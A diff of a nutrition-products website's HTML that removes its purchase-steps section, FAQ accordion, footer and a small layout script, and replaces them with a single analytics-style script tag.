-                                        <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#1f1f1f"><path d="M440-240 200-480l240-240 56 56-183 184 183 184-56 56Zm264 0L464-480l240-240 56 56-183 184 183 184-56 56Z"/></svg>
-                                        <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#1f1f1f"><path d="M440-240 200-480l240-240 56 56-183 184 183 184-56 56Zm264 0L464-480l240-240 56 56-183 184 183 184-56 56Z"/></svg>
-                                        <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#1f1f1f"><path d="M440-240 200-480l240-240 56 56-183 184 183 184-56 56Zm264 0L464-480l240-240 56 56-183 184 183 184-56 56Z"/></svg>
-                                    </div>
-                                    <div class="pm-icon">
-                                        <svg width="25px" height="25px" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                            <path d="M13 0H3V2H13V0Z" fill="#000000"/>
-                                            <path d="M2 4H14V6H2V4Z" fill="#000000"/>
-                                            <path d="M1 8H15V15H1V8Z" fill="#000000"/>
-                                        </svg>
-                                    </div>
-                                </div>
-                                <div class="pm-content">
-                                    <h3 class="pm-title"> Explore our scientifically developed products designed to support balanced nutrition.</h3>
-                                </div>
-                            </div>
-                            <div class="purchase-map-item">
-                                <div class="pm-inner">
-                                    <div class="pm-num">
-                                        <span>03</span>
-                                    </div>
-                                    <div class="pm-arrow">
-                                        <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#1f1f1f"><path d="M440-240 200-480l240-240 56 56-183 184 183 184-56 56Zm264 0L464-480l240-240 56 56-183 184 183 184-56 56Z"/></svg>
-                                        <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#1f1f1f"><path d="M440-240 200-480l240-240 56 56-183 184 183 184-56 56Zm264 0L464-480l240-240 56 56-183 184 183 184-56 56Z"/></svg>
-                                        <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#1f1f1f"><path d="M440-240 200-480l240-240 56 56-183 184 183 184-56 56Zm264 0L464-480l240-240 56 56-183 184 183 184-56 56Z"/></svg>
-                                    </div>
-                                    <div class="pm-icon">
-                                        <svg width="800px" height="800px" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
-                                            <path d="M10 0H6V3H10V0Z" fill="#000000"/>
-                                            <path d="M4 2H2V16H14V2H12V5H4V2Z" fill="#000000"/>
-                                        </svg>
-                                    </div>
-                                </div>
-                                <div class="pm-content">
-                                    <h3 class="pm-title"> Use our tools to plan and organize your meals based on accurate nutritional data.</h3>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </section>
-
-                <section class="need-to-know-sect">
-                    <div class="space-frame need-to-know-flexbox">
-                        <div class="ntk-worktime">
-                            <div class="ntk-worktime-img">
-                                <img class="ntk-worktime-img-img" src="pics/album-YIrCb3.jpg" alt="">
-                            </div>
-                            <div class="ntk-worktime-txt">
-                                <h4>Health Starts Here: Our Food Is Your Source of Strength</h4>
-                            </div>
-                        </div>
-                        <div class="ntk-content">
-                            <h2 class="ntk-title"></h2>
-                            <div class="ntk-faq-accordion">
-                                <div class="ntk-faq-item">
-                                    <input type="checkbox" id="ntk-faq1">
-                                    <label for="ntk-faq1" class="ntk-faq-question">How does Greenfluenceenio ensure the accuracy of nutritional information?</label>
-                                    <div class="ntk-faq-answer">
-                                    We utilize advanced scientific methods and regularly update our data to provide precise and reliable nutrient analysis for all our products..
-                                    </div>
-                                </div>
-                                <div class="ntk-faq-item">
-                                    <input type="checkbox" id="ntk-faq2">
-                                    <label for="ntk-faq2" class="ntk-faq-question">Are the products suitable for special dietary needs?</label>
-                                    <div class="ntk-faq-answer">
-                                    Yes, our products are thoughtfully developed to accommodate a variety of dietary preferences and requirements, including vegetarian and gluten-free options..
-                                    </div>
-                                </div>
-                                <div class="ntk-faq-item">
-                                    <input type="checkbox" id="ntk-faq3">
-                                    <label for="ntk-faq3" class="ntk-faq-question">Can I get personalized nutrition advice through Greenfluenceenio?</label>
-                                    <div class="ntk-faq-answer">
-                                    We provide tools and resources to assist with personalized dietary planning, helping you tailor your nutrition to your specific health goals..
-                                    </div>
-                                </div>
-                                <div class="ntk-faq-item">  
-                                    <input type="checkbox" id="ntk-faq4">
-                                    <label for="ntk-faq4" class="ntk-faq-question">What makes Greenfluenceenio different from other healthy nutrition sites?</label>
-                                    <div class="ntk-faq-answer">
-                                    Our commitment to transparency, innovative product development, and accurate nutrient analysis ensures a trustworthy and effective approach to healthy eating..
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </section>
-                
-            
-            </main>
-
-            
-            <footer>
-                <div class="endzone-section-bg">
-                    <div class="endzone-section-bgoverlay">
-                        <div class="space-frame endzone-section">
-                            <div class="ezs-flexcol ezs-nav">
-                                <h4 class="ezs-nav-title">Navigation</h4>
-                                <a class="ezs-nav-link" href="privacyPolicy.html" target="_blank">Privacy policy</a>
-                                <a class="ezs-nav-link" href="terms-of-service.html" target="_blank">Terms & Conditions</a>
-                                <a class="ezs-nav-link" href="disclaimer.html" target="_blank">Disclaimer</a>
-                            </div>
-                            <div class="ezs-flexcol ezs-logo-box">
-                                <a class="ezs-logo" href="./">
-                                    <img  src="brand.svg" alt="">
-                                    <h2> Greenfluenceenio  </h2>
-                                </a>
-                                <div class="ezs-trust-client">
-                                    <h4 class="ezs-trust-client-title"> Many satisfied customers trust us</h4>
-                                    <p class="ezs-trust-client-txt">Active users visit us every month: &nbsp; 41321&nbsp;Thd</p>
-                                </div>
-                            </div>
-                            
-                        </div>
-                    </div>
-                </div>
-                
-            </footer>
 
 
 
-
-        
-
-        
-
-        <script>
-            const content = document.getElementById('vlblContent');
-            const cloneCount = 3; 
-            for (let i = 0; i < cloneCount; i++) {
-                const clone = content.cloneNode(true);
-                content.parentNode.appendChild(clone);
-            }
-
-            const brandBenefits = document.querySelector('.brand-benefits');
-        if (brandBenefits && getComputedStyle(brandBenefits).display === 'none') {
-            document.querySelectorAll('.brand-story').forEach(el => {
-                el.style.width = '100%';
-                el.style.flexDirection = 'row';
-                el.style.alignItems = 'center';
-            });
-        }
-
-        document.addEventListener('DOMContentLoaded', function() { 
-        const prdsMedia = document.querySelector('.prds-media');
-        if (prdsMedia && getComputedStyle(prdsMedia).flexDirection === 'row') {
-            document.querySelectorAll('.prds-media').forEach(el => {
-            el.style.width = '100%';
-            el.style.alignItems = 'center';
-            el.style.margin = '0 0 20px 0';
-            });
-            document.querySelectorAll('.prds-info').forEach(el => {
-            el.style.width = '45%';
-            });
-            document.querySelectorAll('.prds-img').forEach(el => {
-            el.style.width = '50%';
-            el.style.height = '450px';
-            });
-        }
-        });
+<script defer="" data-domain="iosmd.sire" src="js/script.js"></script>
 
 
-            document.addEventListener('DOMContentLoaded', function() {
-            const media = document.querySelector('.real-rewiews-media');
-            if (media && getComputedStyle(media).display === 'none') {
-                document.querySelectorAll('.real-rewiews-list').forEach(el => {
-                el.style.width = '100%';
-                el.style.flexDirection = 'row';
-                el.style.alignItems = 'center';
-                });
-            }
-            });
-
-        </script>
-        
-        
-    </body>
-</html>
-
+</body></html>
